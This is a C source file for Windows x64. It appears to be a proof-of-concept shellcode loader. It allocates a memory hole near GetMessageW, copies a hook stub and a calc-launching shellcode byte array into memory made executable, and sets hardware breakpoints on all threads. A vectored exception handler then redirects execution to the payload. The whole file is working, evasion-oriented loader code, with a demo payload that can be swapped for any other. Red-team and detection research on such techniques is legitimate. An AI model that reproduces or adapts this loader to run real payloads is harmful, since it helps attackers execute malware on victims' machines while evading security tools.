# include <windows.h>
# include <stdio.h>
# include <TlHelp32.h>

# define PUTS( msg, ... ) printf( "[-] > " msg " Error: %d\n", ##__VA_ARGS__, GetLastError() );
# define MSG( msg, ... ) printf( "[+] > " msg "\n", ##__VA_ARGS__ );

# define TARGET_FUNCTION GetMessageW

void* pMemoryHole = 0;

char hook[42] = {
	0x5B, 0x48, 0x83, 0xEB, 0x05, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50,
	0x41, 0x53, 0x41, 0x52, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41,
	0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};

// x64 calc shellcode
char payload[106] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int HandleHook( BOOL Remove )
{	
	HANDLE			hSnapshot	= 0,
					hThread     = 0;
	THREADENTRY32	Thread		= { .dwSize = sizeof( THREADENTRY32 ) };
	CONTEXT			ThreadCtx	= { 0 };
	int				succeeded	= 0;

	if ( ( hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ) ) == INVALID_HANDLE_VALUE ) {
		PUTS( "Could not create thread snapshot",);
		goto Cleanup;
	}

	if ( !Thread32First( hSnapshot, &Thread ) ) {
		PUTS( "Failed to enumerate threads in the snapshot" );
		goto Cleanup;
	}
	
	do 
	{
		if ( Thread.th32ThreadID && Thread.th32OwnerProcessID == GetCurrentProcessId() )
		{
			if ( ( hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, Thread.th32ThreadID ) ) == NULL ) {
				PUTS( "Could not open handle to thread %d in PID %d", Thread.th32ThreadID, Thread.th32OwnerProcessID );
				goto Cleanup;
			}

			RtlZeroMemory( &ThreadCtx, sizeof( CONTEXT ) );
			ThreadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

			if ( !GetThreadContext( hThread, &ThreadCtx ) ) {
				PUTS( "Could not acquire thread context for thread id %d", Thread.th32ThreadID );
				goto Cleanup;
			}

			ThreadCtx.Dr3 = Remove ? 0 : TARGET_FUNCTION;
			ThreadCtx.Dr7 = Remove ? 0 : 0x40;

			if ( !SetThreadContext( hThread, &ThreadCtx ) ) {
				PUTS( "Could not set Dr3 register" );
				goto Cleanup;
			}
			MSG( "%s hardware breakpoint from dr3 register in thread id % d", Remove ? "Removed" : "Installed", Thread.th32ThreadID);
			CloseHandle( hThread );
		}
	} while ( Thread32Next( hSnapshot, &Thread ) );

	succeeded = 1;

Cleanup:
	if ( hSnapshot )
		CloseHandle( hSnapshot );

	if ( hThread )
		CloseHandle( hThread );

	return succeeded;
}

LONG CALLBACK VEH( PEXCEPTION_POINTERS Exception )
{
	/*
		Step 6; Hijack RIP, remove hooks & continue process execution
	*/
	if 
	(
		Exception->ExceptionRecord->ExceptionAddress == (ULONG_PTR)TARGET_FUNCTION
		&& Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP
	)
	{
		Exception->ContextRecord->Rip = pMemoryHole;
		HandleHook( TRUE );
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

int main()
{
	ULONG_PTR		ulMemoryHoleBase = 0,
					ulPayloadBase = 0,
					ulTargetFunc = ( ULONG_PTR )TARGET_FUNCTION;
	int				payload_size = 0;
	DWORD			old_protection = 0;

	/*
		Step 1; Add the VEH function. This is what triggers the payload.
	*/
	if ( AddVectoredExceptionHandler( 1, VEH ) == NULL ) {
		PUTS( "Failed to create vectored exception handler." );
		return -1;
	}

	/*
		Step 2; Locate a memory hole between DLLs within this process. 
	*/
	payload_size = sizeof( hook ) + sizeof( payload );
	for ( 
		ulMemoryHoleBase = ( ulTargetFunc & 0xFFFFFFFFFFFF0000 ) - 0x70000000; 
		ulMemoryHoleBase < ulTargetFunc + 0x70000000;
		ulMemoryHoleBase += 0x10000 
	)
	{
		pMemoryHole = VirtualAlloc( ( void* )ulMemoryHoleBase, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
		if ( !pMemoryHole )
			continue;

		break;
	};
	MSG( "Located memory hole at the address 0x%p", pMemoryHole );

	/*
		Step 3; Write the payload to the memory hole. Begin with hook, followed by main shellcode.
	*/
	memcpy( pMemoryHole, hook, sizeof( hook ) );
	MSG( "Wrote hook to memory hole" );

	ulPayloadBase = ( ULONG_PTR )pMemoryHole + sizeof( hook );
	memcpy( ( void* )ulPayloadBase, payload, sizeof( payload ) );
	MSG( "Wrote payload below hook at 0x%llu in memory hole", ulPayloadBase );

	if (!VirtualProtect(pMemoryHole, payload_size, PAGE_EXECUTE_READWRITE, &old_protection ) )
	{
		PUTS("Failed to set memory permissions on shellcode @ 0x%p", pMemoryHole );
		goto Cleanup;
	}

	/*
		Step 4; Install hardware breakpoints
	*/
	if ( !HandleHook( FALSE ) ) {
		PUTS( "Failed to install hook. ");
		goto Cleanup;
	}
	MSG( "Installed breakpoints on all threads. Awaiting thread to hit hardware breakpoint..." );
	
	/*
		Step 5; Run the hooked function to trigger the payload;
	*/
	TARGET_FUNCTION(0,0,0,0);

Cleanup:

	MSG( "Clean exit. Press enter to quit..." );
	getchar();

	return 0;
}